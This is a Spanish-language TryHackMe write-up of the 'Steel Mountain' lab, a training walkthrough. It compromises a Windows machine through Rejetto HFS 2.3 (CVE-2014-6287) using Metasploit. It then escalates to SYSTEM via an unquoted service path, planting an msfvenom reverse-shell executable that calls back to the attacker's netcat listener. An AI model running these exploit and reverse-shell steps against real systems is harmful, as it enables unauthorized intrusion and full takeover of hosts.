---
title: "Steel Mountain"
description: "Writeup de la sala Steel Mountain de TryHackMe. Una guía para comprometer una máquina Windows explotando un servidor de archivos HFS y escalando privilegios mediante Unquoted Service Path."
date: "2025-12-24"
published: true
tags: ["tryhackme", "pentesting", "writeup", "windows", "privilege escalation", "metasploit"]
readTime: "20 min"
---

# Steel Mountain — Writeup TryHackMe

## 📖 Introducción

La sala **Steel Mountain** de TryHackMe es un excelente entorno para practicar la enumeración y explotación de sistemas Windows. En este reto, nos enfrentaremos a un servidor web vulnerable y aprenderemos a escalar privilegios abusando de una mala configuración en los servicios del sistema conocida como **Unquoted Service Path**.

Esta máquina es ideal para entender cómo las vulnerabilidades en software de terceros y las configuraciones inseguras pueden comprometer un sistema entero.

---

## 🔎 Reconocimiento

Comenzamos nuestra fase de reconocimiento con un escaneo de puertos utilizando **Nmap** para descubrir los servicios activos.

```bash
nmap -sVC -T4 -p- <IP-MAQUINA>
```

**Resultados principales:**

- **80/tcp (HTTP):** Microsoft IIS httpd 8.5.
- **8080/tcp (HTTP):** Rejetto HTTP File Server 2.3.
- **135/tcp (MSRPC):** Microsoft Windows RPC.
- **139/445 (SMB):** Microsoft Windows netbios-ssn.
- **3389/tcp (RDP):** Microsoft Terminal Services.

Al visitar el puerto **80**, encontramos una página web con la foto del "Empleado del mes" (Bill Harper). Sin embargo, el puerto **8080** resulta mucho más interesante.

### Enumeración Web (Puerto 8080)

Al acceder a `http://<IP>:8080`, nos encontramos con una aplicación llamada **Rejetto HTTP File Server 2.3**.

Una búsqueda rápida de vulnerabilidades para esta versión revela que es susceptible a una ejecución remota de código (RCE).

- **Vulnerabilidad:** Rejetto HFS 2.3 RCE
- **CVE:** CVE-2014-6287

---

## 🚀 Acceso Inicial

Para explotar esta vulnerabilidad, podemos utilizar **Metasploit**.

1. Iniciamos Metasploit y buscamos el exploit:

```bash
msfconsole
search rejetto
use exploit/windows/http/rejetto_hfs_exec
```

2. Configuramos las opciones necesarias:

```bash
set RHOSTS <IP-MAQUINA>
set RPORT 8080
set LHOST <TU-IP-VPN>
run
```

Si el exploit tiene éxito, obtendremos una sesión de **Meterpreter** con acceso al sistema. Podemos buscar la primera bandera en el escritorio del usuario.

```bash
cd C:/Users/bill/Desktop
cat user.txt
```

---

## 🔐 Escalada de Privilegios

Ahora que tenemos acceso inicial, necesitamos elevar nuestros privilegios a `SYSTEM`. Para ello, utilizaremos un script de enumeración como **PowerUp.ps1** (parte de PowerSploit) para buscar vectores de escalada.

### Enumeración con PowerUp

Subimos el script a la máquina víctima:

```bash
upload /ruta/a/PowerUp.ps1
load powershell
powershell_shell
. .\PowerUp.ps1
Invoke-AllChecks
```

El script identifica una vulnerabilidad interesante: **Unquoted Service Path** en el servicio `AdvancedSystemCareService9`.

### ¿Qué es Unquoted Service Path?

Cuando un servicio de Windows tiene una ruta de ejecutable que contiene espacios y no está entre comillas (por ejemplo, `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`), Windows intenta ejecutar el programa en el siguiente orden:

1. `C:\Program.exe`
2. `C:\Program Files.exe`
3. `C:\Program Files (x86)\IObit\Advanced.exe`
4. ... y finalmente el ejecutable real.

Si tenemos permisos de escritura en alguna de estas carpetas intermedias, podemos colocar nuestro propio ejecutable malicioso y Windows lo ejecutará con los privilegios del servicio (en este caso, `SYSTEM`).

### Explotación

1. **Generar payload:** Creamos un ejecutable malicioso con `msfvenom` llamado `Advanced.exe` (para que coincida con la parte "Advanced" de la ruta).

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<TU-IP> LPORT=4444 -f exe -o Advanced.exe
```

2. **Detener el servicio:**

```bash
sc stop AdvancedSystemCareService9
```

3. **Subir y colocar el payload:** Subimos `Advanced.exe` a la carpeta `C:\Program Files (x86)\IObit\`.

```bash
cd "C:\Program Files (x86)\IObit"
upload Advanced.exe
```

4. **Reiniciar el servicio:** Iniciamos un listener de Netcat en nuestra máquina atacante y arrancamos el servicio.

```bash
# En tu máquina local
nc -lvnp 4444
```

```bash
# En la máquina víctima
sc start AdvancedSystemCareService9
```

Al iniciar el servicio, Windows ejecutará nuestro `Advanced.exe` en lugar del servicio legítimo, otorgándonos una shell con privilegios de **SYSTEM**.

### Bandera Root

Finalmente, navegamos al escritorio del administrador para obtener la bandera final.

```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

---

## 📝 Conclusión

La máquina Steel Mountain nos enseña la importancia de mantener el software actualizado (Rejetto HFS) y de configurar correctamente los servicios del sistema. La vulnerabilidad de **Unquoted Service Path** es un clásico en entornos Windows y una "fruta madura" (low-hanging fruit) que todo pentester debe saber identificar.
